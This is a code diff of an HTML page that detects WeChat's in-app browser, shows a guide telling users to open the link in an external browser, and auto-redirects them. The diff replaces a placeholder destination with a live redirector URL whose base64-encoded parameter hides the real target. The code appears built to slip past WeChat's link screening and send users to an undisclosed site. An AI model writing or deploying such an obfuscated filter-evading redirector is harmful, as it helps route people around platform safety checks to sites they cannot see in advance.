@@ -31,13 +31,28 @@
         .guide-image {
             width: 100%;
             max-width: 300px;
-            margin-bottom: 20px;
+            margin: 0 auto;
+        }
+        
+        .guide-image.top {
+            margin-bottom: 15px;
+        }
+        
+        .guide-image.bottom {
+            border-radius: 12px; /* 下方图片圆角 */
+            overflow: hidden; /* 确保圆角生效 */
+            margin-top: 15px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1); /* 添加轻微阴影增强立体感 */
         }
         
         .guide-text {
-            margin-top: 20px;
-            color: #666;
+            margin: 15px 0;
+            color: #333;
             font-size: 16px;
+            padding: 10px 15px;
+            background: rgba(255,255,255,0.8);
+            border-radius: 8px;
+            display: inline-block;
         }
         
         /* 错误提示样式 */
@@ -67,11 +82,13 @@
     </style>
 </head>
 <body>
-    <!-- 微信引导页面 -->
+    <!-- 微信引导页面 - 新版布局 -->
     <div id="weixinGuide" class="weixin-guide">
-        <img src="/guide-top.png" alt="第一步：点击右上角三个点" class="guide-image">
-        <img src="/guide-bottom.png" alt="第二步：选择在浏览器中打开" class="guide-image">
+        <img src="/guide-top.png" alt="第一步：点击右上角三个点" class="guide-image top">
+        
         <p class="guide-text">请点击右上角 <span style="font-size: 1.2em;">···</span> 选择"在浏览器中打开"</p>
+        
+        <img src="/guide-bottom.png" alt="第二步：选择在浏览器中打开" class="guide-image bottom">
     </div>
     
     <!-- 错误提示 -->
@@ -91,7 +108,6 @@
         // 生成随机字符串
         function generateRandomString() {
             try {
-                // 优先使用更安全的随机数生成方式
                 if (window.crypto && crypto.getRandomValues) {
                     const array = new Uint32Array(1);
                     crypto.getRandomValues(array);
@@ -109,8 +125,6 @@
             console.error('页面加载错误:', error);
             document.getElementById('errorCode').textContent = error.message || error;
             document.getElementById('errorMessage').style.display = 'block';
-            
-            // 隐藏引导页面（如果已显示）
             document.getElementById('weixinGuide').style.display = 'none';
         }
         
@@ -123,18 +137,15 @@
         
         // 获取目标URL带随机参数
         function getTargetUrl() {
-            const baseUrl = "https://您的目标网站.com"; // 请替换为实际地址
+            const baseUrl = "http://laicai.66ghz.com/c.htm?c=aHR0cDovL3h6enouaHVpc2hpLm5hbWUvc2FmZS9pbmRleD9pZD0xNjE="; // 请替换为实际地址
             const randomParam = "t=" + generateRandomString();
             return baseUrl + (baseUrl.includes('?') ? '&' : '?') + randomParam;
         }
         
-        // 安全跳转函数（处理可能的错误）
+        // 安全跳转函数
         function safeRedirect(url) {
             try {
-                // 尝试使用replace方法避免历史记录问题
                 window.location.replace(url);
-                
-                // 如果replace被阻止，尝试普通跳转
                 setTimeout(() => {
                     window.location.href = url;
                 }, 500);
@@ -147,16 +158,11 @@
         function handleWeixinFlow() {
             const currentUrl = window.location.href;
             
-            // 如果URL中不包含wxrnd参数，说明是首次加载
             if (!currentUrl.includes('wxrnd=')) {
                 safeRedirect(getCurrentUrlWithRandom());
-            } 
-            // 如果已包含wxrnd参数，显示引导页
-            else {
+            } else {
                 try {
                     document.getElementById('weixinGuide').style.display = 'flex';
-                    
-                    // 添加点击提示
                     document.body.addEventListener('click', () => {
                         alert('请点击右上角···菜单，选择"在浏览器中打开"');
                     });
@@ -169,7 +175,6 @@
         // 初始化函数
         function init() {
             try {
-                // 添加重试按钮事件
                 document.getElementById('retryButton').addEventListener('click', () => {
                     document.getElementById('errorMessage').style.display = 'none';
                     if (isWeixinBrowser()) {
@@ -179,7 +184,6 @@
                     }
                 });
                 
-                // 根据环境执行不同逻辑
                 if (isWeixinBrowser()) {
                     handleWeixinFlow();
                 } else {
@@ -192,7 +196,6 @@
         
         // 页面加载后初始化
         window.addEventListener('load', init);
-        // 如果load事件未触发，DOMContentLoaded后尝试
         window.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
